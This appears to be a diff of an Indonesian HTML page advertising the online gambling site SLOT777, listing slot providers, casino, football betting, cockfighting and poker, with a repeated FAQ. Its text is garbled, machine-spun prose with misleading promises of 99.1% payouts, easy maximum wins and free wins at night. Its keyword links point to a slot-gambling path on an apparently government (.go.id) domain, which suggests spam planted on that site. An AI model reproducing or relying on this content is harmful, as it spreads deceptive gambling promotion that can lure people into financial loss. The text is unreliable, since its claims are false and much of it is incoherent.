+<p>Terdapat banyak hadiah dan promo Situs Slot Gacor hari ini 2022 2022 yang bisa Kalian klaim bersama SLOT777. Buat memandang berbagai promo dan hadiah menarik yang terdapat, silahkan masuk ke menu promo. Pada halaman tersebut hendak tertera jelas segala syarat dan ketentuan bonus yang hendak Kalian miliki. Apabila Kalian mendapatkan hambatan kala bermain di SLOT777 jangan pernah sungkan buat menghubungi Live Chat SLOT777 yang tetap bertugas 24/ 7. Kalian nyatanya bisa menghubungi Live Chat kapan pula dan di manapun. Mengenai ini ialah salah satu tata cara SLOT777 buat berupaya sebaik dapat jadi dalam memberikan pelayanan yang terbaik.</p>
+<h2><strong>19 Provider Situs Slot Gacor hari ini 2022 Hari Ini Ditentukan Maxwin Terbesar</strong></h2>
+<h3><strong>Apa provider link Situs Slot Gacor hari ini 2022 maxwin</strong></h3>
+<p>bisa dipercayai serta paling banyak jadi pengembang dari permainan slot yang bisa dimainkan oleh sepenuhnya orang? Berikut catatan Link Situs Slot Terbaru itu:</p>
+<h3><strong>Link SLOT777 Pragmatic Play</strong></h3>
+<p>Pragmatic Play yakni satu antara lain provider slot yang sudah berdiri mulai sejak tahun 2008 serta sukses merasakan banyak atensi dari pemain link Situs <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>Slot Gacor</strong></a> hari ini 2022 maxwin</p>
+<p>pula bisa disebutkan Pragmatic Play yakni musuh terkuat dari provider Joker123, tiap- masing- masing tipe permainan mereka mempunyai tingkatan RTP live kemenangan sangat besar ialah sebesar 99, 1% sampai tidak bimbang kemenangan bisa didapatkan dengan gampang di Pragmatic Play. Lantaran ayang terdapat di dalam<br />yang sudah Menimpa yang semacam itu pula terdapat sebagian suatu pemain yang bernazar buat di permainkan dalam suatu taruhan.</p>
+<h3><strong>Link SLOT777 SLOT777</strong></h3>
+<p>SLOT777 ialah provider link Situs Slot Gacor hari ini 2022 maxwin sangat atas disaat ini serta begitu termasyhur dilapisan pemain. SLOT777 sendiri yakni Link situs Slot Terbaru yang baru ada mulai sejak tahun 2020 dalam menaikkan permainan link Situs Slot Gacor hari ini 2022 maxwin sangat atas dengan kemunculan sangat dikala ini.</p>
+<p>Permainan yang dikasihkan oleh SLOT777 yakni sangat gampang menang, karena RTP live permainan yang dikasihkan tiap- masing- masing taruhan terkategori besar ialah 97%. Sebagian mode permainan link Situs Slot Gacor hari ini 2022 maxwin di provider SLOT777 jadi termasyhur serta banyak dicari oleh pemain ialah Panda Pursuit, King Cat, Dragon Orb, 88 Fortune, Golden Empress Serta Joker Jewel 88.</p>
+<h3><strong>Link SLOT777 Habanero</strong></h3>
+<p>Habanero yakni Link situs Slot Terbaru yang sesuai sama disandingkan dengan provider paling banyak yang lain semacam slot Pragmatic Play serta Joker123, karenanya bertepatan waktu sebagian pemain yang mulai usaha buat bermain di provider Habanero ini. Pula permainan link Situs Slot Gacor hari ini 2022 maxwin</p>
+<p>yang hendak sukses dalam menarik suatu yang banyak penyuka ialah di dalam permainan slot Zeus, yang tidak cuma itu saja yang ada di dalam suatu permainan yang lain yang cuma mulai meletus serta hendak semacam permainan Koi Gate, permainan Lucky Fortune Cat, permainan 5 Lucky Lions, yang Suka Ape serta Candy Tower. Tiap- masing- masing yang terdapat di permainan itu hendak mempunyai nilai kemenangan tidak seragam, yang pasti seluruhnya bergantung dengan berapakah nilai taruhan kalian gunakan.</p>
+<h3><strong>Link SLOT777 Joker123</strong></h3>
+<p>Joker123 ialah pemicu dini kalinya permainan link Situs Slot Gacor hari ini 2022 maxwin<br />buat diperkenal di di dunia link situs Slot Terbaru, Joker123 bisa disebutkan provider tersukses. Pula penyuka buat mainkan sungguh- sangat gak menyusut, meski demikian terus jadi lebih terus- meneus tiap- masing- masing waktunya selama ini. Permainan slot Joker123 yang sering datangkan buat sebagian bermacam invitasi dalam suatu slot yang hendak bisa untuj dituruti oleh yang sebagian dalam suatu pemain dari sebagian regu, yang hadiah yang dikasihkan begitu sangat besar sekali. Karena itu ini bisa datangkan bonus keuntungan buat kamu yang bermain di Joker123.</p>
+<h3><strong>Link SLOT777 PG Slot Soft</strong></h3>
+<p>Permainan PG Slot yang sudah mempunyai dalam suatu kepajangan Pocket Gaming buat Slot Soft yakni yang telah provider yang baru ada pada di dunia dalam suatu permainan judi yang terdapat pada tahun 2018 akhir, mereka sudah sukses merasakan pengakuan dari dunia judi internasional dalam membagikannya permainan link Situs Slot Gacor hari ini 2022 maxwin</p>
+<p>simpel menang. Pusat di dalam permainan PG Slot sendiri ada pada Las Vegas yang akan<br />buat tipe sebagian yang terdapat di game yang hendak terakhir dengan suatu dari kontribusi technologi mutakhir, jumlah dari permainan itu telah dibikin sebagian 600 tipe sampai disaat ini serta terus jadi. suatu tipe dalam suatu permainan mereka yang sukses yang menarik serta telah banyak yang penyuka disaat ini yang ialah Double Fortune, Mahjong Ways, Candy Bonanza, Treasures Of Aztec serta sebagian yang lain.</p>
+<h3><strong>Link SLOT777 Advantplay</strong></h3>
+<p>Advantplay dibikin buat mengimbangi dari provider SLOT777, kelebihan dari provider Advantplay sendiri ialah mempunyai kemunculan sederhana meski demikian menarik sampai sebagian pemain banyak tertarik buat coba bermain di ayo. Petunjuk dari tipe permainan slot yang mereka suguhkan ialah Lucky Dragon, Bom Bom Slot Bot, Fortune Gods Pot serta King of Glory.</p>
+<h3>Link SLOT777 Microgaming</h3>
+<p>Microgaming yakni provider dengan 450 tipe permainan link Situs Slot Gacor hari ini 2022 maxwin gacor yang terlaku, tidak cuma itu saja Permainan Microgaming yakni salah satu dari antara lain pangkalan yang memberikan jadi 2 permainan serta sekaligus yang terdapat didalamnya ialah link Situs Slot Gacor hari ini 2022 maxwin serta live casino. Opsi dari suatu permainan yang hendak diunggulkan didalam suatu provider ini ialah suatu permainan 777 Mega Deluxe, Permainan Golden Stallion, Permainan Lucky Twins Wilds serta Permainan Dragon Shard.</p>
+<h3><strong>Link SLOT777 Playtech</strong></h3>
+<p>Industri Didalam suatu Playtech yang banyak datangkan dalam suatu opsi dari permainan Situs Slot Gacor hari ini 2022 yang mudah maxwin Top dengan yang terdapat di perbandingan kemenangan sangat besar buat di masing- masing dalam suatu dari tipe yang terdapat di dalam suatu permainannya, yang hendak kami mempunyai suatu petunjuk buat kamu yang tertarik buat bermain di ayo biar simpel menang ialah bermain disaat jam malam sampai subuh. Karena disaat jam malam itu mereka sering memberikan kemenangan secara gratis.</p>
+<h3><strong>Link SLOT777 Live22</strong></h3>
+<p>Pangkalan Live22 yakni salah satunya industri yang datangkan permainan link Situs Slot Gacor hari ini 2022 maxwin</p>
+<p>dapat dimainkan secara live, kelebihan dari fitur live ini ialah kalian bisa tonton langsung putaran taruhan yang tengah jalan. Tidak cuma itu kalian pula dikawal oleh sebagian wanita mempesona serta seksi didalamnya.</p>
+<h3><strong>Link SLOT777 ION Slot</strong></h3>
+<p>hingga dari mereka yang sudah untuk meyakinkan dengan yang dibuat buat dala,dari pangkalan yang sangat teristimewa dengan mengayomi di dalam sebuah dari game slot namanya ION Slot. yang ada seperti Jenis game yang sudah disediakan oleh pangkalan ini atraktif sekali dengan sebuah provider yang lain,dan pula yang akan hitungan kemenangan mereka ialah yang sekurang- sedikitnya sama sendiri dibandingkan yang lain.</p>
+<h3><strong>Link SLOT777 Spadegaming</strong></h3>
+<p>Permainan di Spadegaming ialah sebuah dari game yang provider di dalam sebuah dari slot sangat tua yang berurutan keempat selepas dari permainan dari Joker123, Pragmatic Play dan Habanero. Spadegaming provider sangat populer disaat ini sekarang dengan sebuah kelebihan yang mereka bawakan untuk berujud dalam sebuah keamanan yang akan sangat andal,yang tidak hanya itu mereka yang menjual sebuah dari fitur yang lain yakni unjuk rasa slot Spadegaming. Hingga untuk bisa buat kalian yang hanya pengen untuk mencoba untuk bermain lebih dulu game yang terdapat pada yang ada didalamnya tidak terdapat untuk menggunakan modal.game yang sangat Provider ini yang akan dapat juga disebutkan jadi opsi yang sangat sesuai tidak hanya sebuah provider SLOT777 apabila kamu lagi merasa bosan permainkan provider itu.</p>
+<h3><strong>Link SLOT777 Gamatron</strong></h3>
+<p>Pengembang Gamatron belum lama ini terdapat dalam industri sangat banyak yakni Nexus Engine pada tahun 2021 akhir tahun, inspirasi game yang mereka bawakan ditopang dengan technologi terakhir. Yang tentu khasiatnya buat membagikan serunya di pemain, petunjuk opsi game dari Gamatron sendiri yakni Shiba Inu, Dragon Hunter, Bowl of Fortune dan Neo Tokyo.</p>
+<h3><strong>Link SLOT777 Flow Gaming</strong></h3>
+<p>Flow Gaming ialah provider Link Situs Slot Gacor hari ini 2022 maxwin dapat buat dipercayai suatu yang hendak dikeluarkan pada tahun 2007, yang dari mereka lagi diberikan oleh pengembang yang Technology Casino. Flow Gaming sendiri memiliki game Link Situs Slot Gacor hari ini 2022 maxwin dengan mutu yang akan sangat besar,di dalam hal yang ada di dalam berikut sebuah dari petunjuk opsi game itu semacam game Candy Pop,game Magic Kitty, game Big Prosperity dan Zeus. Jenis game yang seperti itu yang termasyhur dan kerap akan bisa untuk membagikan sebuah dari jackpot yang akan sangat banyak,dan untuk sebab itu akan kerap disebutkan ialah slot jackpot.</p>
+<h3><strong>Link SLOT777 JDB</strong></h3>
+<p>Buat kalian yang hanya bisa untuk memiliki dengan modal kecil,yang akan kami sangat untuk menganjurkan sekali buat anda untuk bermain di dalam sebuah dari provider JDB Slot. Yang mereka telah mempersiapkan dari sebuah yang sebuah dari opsi yang jenis game dengan sebuah sekurangnya dalam sebuah dari betting yang sangat murah dengan sebuah dari kesempatan dan sebuah dari kemenangan sama besarnya dengan provider yang lain ada di mainkan.</p>
+<h3><strong>Link SLOT777 CQ9</strong></h3>
+<p>Provider CQ9 ialah satu antara lain bentukan dari negara Cina yang memiliki sebuah dari nuansa seolah lagi di sebuah rimba bambu, yang sudah begitu pula music permainanya seolah lagi terdapat dari sebuah negara Cina.Yang mereka memiliki sebuah dari game Link SLOT777 yang telah dikabarkan dengan semacam Suka game Rich Year,Dalam game Dragon Heart,game Zeus Meter dan Golden Eggs. Sepenuhnya jenis game itu termaksud ke game slot cocok seder hanaha menang.</p>
+<h3><strong>Link SLOT777 PlayN Go</strong></h3>
+<p>PlayN Go ialah satu antara lain link situs Link Slot Terkini lagi termasyhur ataupun terkenal dengan game mereka yang termasyhur yakni Rise Of Olympus, game ini memiliki nuansa seolah lagi terdapat yang pada masa banyak suatu dewa Yunani yakni dewa di Olympus.</p>
+<h3><strong>Link SLOT777 RTG Slot</strong></h3>
+<p>RTG ataupun Real Time Gaming Slot yakni provider yang telah terbilang cukuplah lama bertanding di di dunia Link Slot Terkini, fitur game bisa digapai secara mobile dini kalinya dicetuskan oleh RTG Slot ini. Salah satung musuh besar dari provider ini yakni SLOT777, hingga mereka lagi beradu dalam membagikan game sangat atas.</p>
+<h3><strong>Link SLOT777 One Touch</strong></h3>
+<p>One Touch ialah provider Link Situs Slot Gacor hari ini 2022 maxwin<br />yang begitu banyak memiliki kelebihan, termaksud salah satunya yakni kemunculan sangat simpel hingga buat pemain gak merasa kecemasan. Banyak petunjuk jenis game yang dapat kamu coba semacam Lucky Lion, Bubbles Bonanza, Wheel Of Fortune, Golden Stripe dan Queens of Glory.</p>
+<h3><strong>Link SLOT777 Astrotech</strong></h3>
+<p>Provider Astrotech ialah provider yang sangat akhir bekerja bersama di Link Situs Slot Gacor hari ini 2022 maxwin Nexusengine,Yan dari mereka dibikin di bulan Januari 2022 dan yang tentu bisa untuk langsung merasakan banyak atensi dari banyak pencinta game Situs Slot Gacor hari ini 2022 maxwin Top. Sebagian game mereka telah mengawali ditemui dan termasyhur dilapisan pemain sebutlah.</p>
+<h2><strong>5 Permainan Judi Online Terbaik serta Formal di Indonesia</strong></h2>
+<p>Tidak cuma sediakan game <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>slot online</strong></a> saja, tetapi SLOT777 pula sediakan sarana bermain judi online yang lain yang telah ada serta dapat di mainkan lumayan dengan 1 akun saja yang telah kamu miliki. Dengan bermain di agen judi online SLOT777 pasti saja kamu tidak butuh repot buat melaksanakan transfer saldo dari permainan ke permainan lagi.</p>
+<h3><strong>1.Game Slot Online</strong></h3>
+<p>Mesin slot yang saat ini lebih di tahu dengan istilah slot online jadi opsi no 1 buat para pecinta judi online di dunia sebab kemudahan metode bermainnya tanpa butuh mempunyai strategi apapun.</p>
+<p>Mengapa slot online? Sebab game permainan slot ini sediakan jackpot terbanyak yang dapat kamu miliki tiap harinya semacam kamu dapat amati di progressive jackpot yang ada di taman depan Link SLOT777.</p>
+<h3><strong>2.Game Casino Online</strong></h3>
+<p>Live casino ataupun lebih di tahu dengan casino online ialah salah satu game yang telah terdapat dari jaman dahulu, umumnya orang yang bermain casino ini tentu memainkan game kartu serta dadu contohnya baccarat serta sic bo.</p>
+<h3><strong>3.Game Judi Bola Online</strong></h3>
+<p>Taruhan judi bola online ialah taruhan online yang memainkan 2 regu sepak bola yang lagi bertanding secara real time online. Game judi bola online ini pula dapat kamu mainkan dengan bermacam berbagai tipe semacam mix parlay, over/ under, corner serta masih banyak yang lain.</p>
+<h3><strong>4.Game Sabung Ayam Online Sv388 Indonesia</strong></h3>
+<p>SLOT777 pula salah satu Link agen judi sabung ayam online sv388 serta club388 indonesia yang sediakan pasaran taruhan adu ayam online Wala Meron dengan bermacam berbagai tipe arena yang dapat kamu seleksi.</p>
+<p>Dengan di support oleh sistem HTML5 sehingga kamu tidak butuh lagi melaksanakan unduh sv388 apk ataupun unduh club388 apk lagi buat bermain lewat smartphone kamu.</p>
+<h3><strong>5.Game Idn Poker Online- Idn Poker Apk</strong></h3>
+<p>Poker online merupakan salah satu game judi online yang sangat terkenal saat sebelum game slot online merajai dunia perjudian di Indonesia. Umumnya buat bermain poker ini kamu di haruskan buat melaksanakan unduh idn poker apk ataupun donwload aplikasi idn poker cocok dengan jenis smartphone yang kamu pakai semacam Android serta iOS.</p>
+<h3><strong>FAQ​</strong></h3>
+<h4><strong>1. Apa Itu SLOT777?</strong></h4>
+<p>SLOT777 merupakan Link judi slot online serta slot gacor terlengkap serta terpercaya yang secara formal di tunjuk buat jadi agen judi online terpercaya di Indonesia.</p>
+<h4><strong>2. Apa Link Slot Online Terpercaya di Indonesia?</strong></h4>
+<p>Link slot online terpercaya di Indonesia tahun 2022 merupakan SLOT777 yang sediakan ratusan sampai ribuan game slot gacor dengan winrate paling tinggi.</p>
+<h4><strong>3. Apa Saja Keuntungan dalam Bermain di game Bandar Slot Gacor Hari Ini?</strong></h4>
+<p>Tiap pemain slot online tentu mau memperoleh keuntungan ataupun kemenangan yang besar, dengan bermain di bandar slot gacor hari ini pasti saja kamu hendak memperoleh bocoran permainan slot gacor on fire secara free.</p>
+<h4><strong>4. Apakah Permainan Slot Gacor Gampang Maxwin?</strong></h4>
+<p>SLOT777 tidak menjanjikan membernya buat memperoleh maxwin, tetapi bila bermain bersama kami hingga kamu hendak memperoleh bocoran slot gacor hari ini serta link rtp slot paling tinggi yang mempermudah kamu buat memperoleh kemenangan apalagi maxwin.</p>
+<h4><strong>5. Gimana Metode Menang Bermain Slot?</strong></h4>
+<p>Sesungguhnya tidak terdapat metode buat menjamin kemenangan dalam bermain slot online, tetapi panduan menang slot dari agen SLOT777 yakni bila kamu telah memperoleh kemanangan 10% dari modal kamu, hingga silahkan withdrawkan terlebih dulu.</p>
+<h2><strong>Link Slot Online Gacor Gampang Maxwin​</strong></h2>
+<p>SLOT777 merupakan Link <a href="https://jdih.gunungsitolikota.go.id/slot-gacor/"><strong>slot online gacor</strong></a> terpercaya gampang maxwin dengan sediakan ribuan game permainan slot menarik dengan jackpot terbanyak yang sangat gampang di miliki. Dikala ini game slot gacor lagi sangat terkenal di Asia spesialnya di Indonesia, bersama SLOT777 kamu dapat bermain permainan slot gacor gampang maxwin serta jackpot terbanyak dengan memakai link RTP Live Slot yang telah kami sajikan di atas yang senantiasa pembaharuan tiap jam nya.</p>
+                <div itemscope itemtype="https://schema.org/SoftwareApplication">
+                    <table class="SLOT777" style="width:100%;">
+                      <thead>
+                        <tr>
+                          <th colspan="3">SLOT777</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        <tr>
+                          <td class="tab-title">Nama Game:</td>
+                          <td>
+                            <span itemprop="name">Situs Slot Gacor Hari Ini</span>
+                          </td>
+                        </tr>
+                        <tr>
+                          <td class="tab-title">Platform:</td>
+                          <td>
+                            <span itemprop="operatingSystem">ANDROID</span>, <span itemprop="operatingSystem">IOS</span>, <span itemprop="operatingSystem">WINDOWS</span>, <span itemprop="operatingSystem">OSX</span>, dan <span itemprop="operatingSystem">WEB</span>
+                          </td>
+                        </tr>
+                        <tr>
+                          <td class="tab-title">Kategori:</td>
+                          <td>
+                            <span itemprop="applicationCategory" content="GameApplication">Slot Gacor</span>
+                          </td>
+                        </tr>
+                        <tr>
+                          <td class="tab-title">Minimal Deposit:</td>
+                          <td>
+                            <div itemprop="offers" itemscope itemtype="https://schema.org/Offer">Rp <span itemprop="price"> 50.000</span>
+                              <meta itemprop="priceCurrency" content="IDR" />
+                            </div>
+                          </td>
+                        </tr>
+                      </tbody>
+                    </table>
+                  </div>
+                  <br />
+                  <hr />
+                <h3>
+                  <strong>FAQ + Tentang Situs Slot Online Terpercaya slot resmi Slot Gacor SLOT777</strong>
+                </h3>
+                <amp-accordion class="accordion full-bottom">
+                  <section>
+                    <h4>1. Apa Itu SLOT777?<span class="faq-arrow">▾</span>
+                    </h4>
+                    <div>
+                    <p style="text-align: justify;">SLOT777 merupakan Link judi slot online serta slot gacor terlengkap serta terpercaya yang secara formal di tunjuk buat jadi agen judi online terpercaya di Indonesia.
+                    </p>
+             
+                    </div>
+                  </section>
+                  <section>
+                    <h4>2. Apa Link Slot Online Terpercaya di Indonesia?<span class="faq-arrow">▾</span>
+                    </h4>
+                    <div>
+                    <p style="text-align: justify;">Link slot online terpercaya di Indonesia tahun 2022 merupakan SLOT777 yang sediakan ratusan sampai ribuan game slot gacor dengan winrate paling tinggi.</p>
+                    </div>
+                  </section>
+                  <section>
+                    <h4>3. Apa Saja Keuntungan dalam Bermain di game Bandar Slot Gacor Hari Ini?<span class="faq-arrow">▾</span>
+                    </h4>
+                    <div>
+                    <p style="text-align: justify;">Tiap pemain slot online tentu mau memperoleh keuntungan ataupun kemenangan yang besar, dengan bermain di bandar slot gacor hari ini pasti saja kamu hendak memperoleh bocoran permainan slot gacor on fire secara free.</p>
+                    </div>
+                  </section>
+                  <section>
+                    <h4>4. Apakah Permainan Slot Gacor Gampang Maxwin?<span class="faq-arrow">▾</span>
+                    </h4>
+                    <div>
+                    <p style="text-align: justify;">SLOT777 tidak menjanjikan membernya buat memperoleh maxwin, tetapi bila bermain bersama kami hingga kamu hendak memperoleh bocoran slot gacor hari ini serta link rtp slot paling tinggi yang mempermudah kamu buat memperoleh kemenangan apalagi maxwin.</p>
+                    </div>
+                  </section>
+                  <section>
+                    <h4>5. Gimana Metode Menang Bermain Slot?<span class="faq-arrow">▾</span>
+                    </h4>
+                    <div>
+                    <p style="text-align: justify;">Sesungguhnya tidak terdapat metode buat menjamin kemenangan dalam bermain slot online, tetapi panduan menang slot dari agen SLOT777 yakni bila kamu telah memperoleh kemanangan 10% dari modal kamu, hingga silahkan withdrawkan terlebih dulu.</p>
+                    </div>
+                  </section>
+					
+                </amp-accordion>
               </div>
-            </div>
-          </div>
-          <div class="fixed-footer">
-            <a href="https://rebrand.ly/istanacuan" rel="nofollow noopener" target="_blank">
-              <amp-img layout="intrinsic" height="75" width="75" src="https://i.ibb.co/28RHb0t/bonus-slot-gacor.png"></amp-img> Bonus
-            </a>
-            <a href="https://rebrand.ly/istanacuan" rel="nofollow noopener" target="_blank" class="tidi">
-              <amp-img class="center" layout="intrinsic" height="50" width="50" src="https://i.ibb.co/S551RxT/login-slot-gacor.png" alt="slot hoki"></amp-img> Daftar
-            </a>
-            <a href="https://direct.lc.chat/14717895/" rel="nofollow noopener" target="_blank" class="live-chat">
-              <amp-img class="live-chat-icon" layout="intrinsic" height="75" width="75" src="https://i.ibb.co/BKH225P/Live-chat-slot-gacor.png" alt="Live Chat"></amp-img> Live Chat
-            </a>
-          </div>
-  </body>
-  </body>
-</html>
+              <div class="container">
+                <div class="copyleft acenter pb-2">
+                  <span>&copy; 2022 • SLOT777 Link Situs Slot Gacor Hari Ini 2022 Terbaru Auto Maxwin</span>
+                </div>
+              </div>
+              </div>
+              </div>
+              </div>
+              </div>
+              </div>
+             
+              </body>
+              </html>
